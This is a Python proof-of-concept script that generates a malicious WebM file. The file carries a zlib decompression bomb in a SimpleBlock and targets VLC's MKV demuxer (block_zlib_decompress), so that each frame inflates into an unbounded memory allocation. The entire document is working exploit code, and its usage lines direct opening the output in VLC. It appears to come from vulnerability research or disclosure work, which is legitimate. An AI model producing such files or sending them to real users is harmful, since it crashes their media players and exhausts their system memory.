#!/usr/bin/env python3
"""
DOS-003 PoC: Per-frame zlib decompression bomb (block_zlib_decompress)

Target:  modules/demux/mkv/util.cpp:126-143 (block_zlib_decompress)
         mkv.cpp:620 (BlockDecode dispatch)

Trigger: ContentEncodingScope=1 (all frames) + ContentCompAlgo=0 (zlib)
         → each SimpleBlock inflated through unbounded block_Realloc loop

Usage:
  python gen_dos003_webm.py [decomp_mb=16] [output.webm]
  vlc output.webm   # watch memory grow per frame
"""
import sys, struct, zlib


def ebml_id(v):
    v = v & 0xFFFFFFFF
    if v <= 0xFF:       return struct.pack('>B', v)
    elif v <= 0xFFFF:   return struct.pack('>H', v)
    elif v <= 0xFFFFFF: return struct.pack('>I', v)[1:]
    return struct.pack('>I', v)


def vint(v):
    if v < 0x80: return struct.pack('>B', v | 0x80)
    w, mx = 1, 0x80
    while v >= mx: w += 1; mx = (mx << 7) | 0x7F
    return (v | ((0x80 >> (w - 1)) << ((w - 1) * 8))).to_bytes(w, 'big')


def elem(eid, data):
    return ebml_id(eid) + vint(len(data)) + data


def make_webm(decomp_mb=16):
    """WebM: V_VP8 track with zlib-compressed SimpleBlock"""

    raw = b'\x00' * (decomp_mb * 1024 * 1024)
    c = zlib.compressobj(9)
    bomb = c.compress(raw) + c.flush()

    # EBML header
    header = elem(0x1A45DFA3,
        elem(0x4286, b'\x01') + elem(0x42F7, b'\x01') +
        elem(0x42F2, b'\x04') + elem(0x42F3, b'\x08') +
        elem(0x4282, b'webm') + elem(0x4287, b'\x04') + elem(0x4285, b'\x02'))

    # Info
    info = elem(0x1549A966,
        elem(0x2AD7B1, struct.pack('>I', 1000000)) +
        elem(0x4489, struct.pack('>d', 10.0)) +
        elem(0x4D80, b'dos003') + elem(0x5741, b'dos003'))

    # ContentEncodings: scope=1 (all frames), algo=0 (zlib)
    cenc = elem(0x6D80, elem(0x6240,
        elem(0x5031, b'\x00') +                      # ContentEncodingOrder=0
        elem(0x5032, b'\x01') +                      # ContentEncodingScope=1 (ALL FRAMES)
        elem(0x5033, b'\x00') +                      # ContentEncodingType=0 (compression)
        elem(0x5034, elem(0x4254, b'\x00'))          # ContentCompAlgo=0 (zlib)
    ))

    # Track: V_VP8 640x480
    track = elem(0xAE,
        elem(0xD7, b'\x01') +                        # TrackNumber=1
        elem(0x73C5, b'\x01') +                      # TrackUID=1
        elem(0x83, b'\x01') +                        # TrackType=1 (video)
        elem(0x86, b'V_VP8') +                       # CodecID
        elem(0xE0, struct.pack('>H', 640)) +         # PixelWidth
        elem(0xBA, struct.pack('>H', 480)) +         # PixelHeight
        cenc)

    # SimpleBlock: Track=1, timecode=0, flags=0x80 (keyframe), lacing=0
    block_data = struct.pack('>B', 0x81) + struct.pack('>h', 0) + b'\x00' + bomb
    simple_block = elem(0xA3, block_data)

    # Cluster
    cluster = elem(0x1F43B675,
        elem(0xE7, struct.pack('>B', 0)) + simple_block)  # Timecode=0

    # Segment = Info + Tracks + Cluster
    segment = elem(0x18538067,
        info + elem(0x1654AE6B, track) + cluster)

    return header + segment


def main():
    decomp_mb = 16
    out = "dos003_test.webm"
    if len(sys.argv) > 1: decomp_mb = int(sys.argv[1])
    if len(sys.argv) > 2: out = sys.argv[2]

    print("DOS-003: Per-frame zlib bomb (block_zlib_decompress)")
    print(f"  {decomp_mb}MB per frame via ContentEncodingScope=1")
    webm = make_webm(decomp_mb)
    with open(out, 'wb') as f: f.write(webm)
    print(f"  {out} ({len(webm)//1024} KB)")
    print(f"  vlc {out}")


if __name__ == '__main__':
    main()
